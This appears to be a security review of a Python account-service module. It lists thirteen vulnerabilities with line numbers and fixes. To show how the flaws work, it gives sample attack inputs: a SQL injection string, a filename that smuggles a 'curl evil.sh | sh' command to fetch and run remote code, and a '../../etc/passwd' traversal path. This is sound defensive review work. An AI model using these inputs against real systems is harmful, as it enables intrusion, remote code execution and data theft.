@@ -1,0 +1,37 @@
+I found 13 security issues in `account_service.py`. Nine are high or critical, and the most serious are the SQL injection and the command injection, which also allows reading arbitrary files.
+
+### Critical
+
+1. **SQL injection (line 34).** `find_by_username` puts `username` straight into the SQL string with an f-string. A username like `' OR role='admin' --` returns any account, and it can be used to pull out password hashes. Because `verify_credentials` (line 55) calls this function, the login form is the way in. **Fix:** use a parameterized query (`WHERE username = ?`), as `find_by_id` already does.
+
+2. **Command injection (lines 120–122).** `filename` goes into a shell command with `shell=True`. A filename like `x; curl evil.sh | sh` runs arbitrary commands. **Fix:** pass the arguments as a list with no shell.
+
+3. **Path traversal and arbitrary file read (lines 119 and 126).** `os.path.join(EXPORT_DIR, filename)` accepts `../../etc/passwd`. It also accepts an absolute path, which makes it ignore `EXPORT_DIR` entirely. The file is then read and returned at line 126, so even if the export fails, the attacker gets the target file's contents. **Fix:** don't take a filename from the caller. Generate one on the server, or check that `os.path.realpath(destination)` is still inside `EXPORT_DIR`.
+
+### High
+
+4. **Hardcoded live secret (line 19).** `SIGNING_KEY = "sk_live_..."` is in the source code, so anyone with access to the repo has it. Rotate it and load it from the environment or a secrets manager.
+
+5. **Plaintext passwords in logs (lines 60–65).** Every successful login writes the user's password to the log. Remove it from the log line, then purge the existing logs.
+
+6. **Weak password hashing (line 75).** It is a single SHA-256 pass with one global "salt" (the signing key) shared by every user. That is fast to brute-force, and users with the same password get the same hash. Use bcrypt, scrypt or argon2 with a separate salt per user.
+
+7. **Missing ownership check in `update_profile` (lines 83–100).** `session_user_id` is never used, so any logged-in user can update any account. Changing someone else's `email` and then requesting a password reset could let them take over that account. The new email also isn't run through `normalize_email`.
+
+8. **Missing ownership check in `get_profile` (lines 103–114).** `session_user_id` is ignored here too, so any user can read any other user's email, role and other profile data.
+
+9. **No permission check on exports (line 117).** `export_account_data` takes `user_id` from the caller and has no session user to compare it with, so anyone can export any account's data.
+
+### Medium
+
+10. **Deactivated accounts can still log in or act (lines 53–69 and 157).** `verify_credentials` never checks `active`, so `deactivate_account` doesn't actually lock anyone out. `deactivate_account` also doesn't check whether the acting admin is still active.
+
+11. **Timing-unsafe hash comparison (line 59).** Comparing with `==` can leak timing information. Use `hmac.compare_digest`.
+
+12. **Stale or wrong file returned after a failed export (lines 124–126).** With `check=False`, a failed export is ignored and whatever file is already at that path gets returned. In a shared folder with predictable names, that can be another user's export.
+
+### Low
+
+13. **Usernames can be discovered by timing (lines 55–57).** A login for a username that doesn't exist returns before any hashing happens, so it is measurably faster.
+
+Separately, the module docstring (lines 4–5) says callers must already have passed the session middleware. That proves a user is logged in, but not which records they are allowed to touch. Issues 7–9 come from relying on that middleware for those per-record checks.
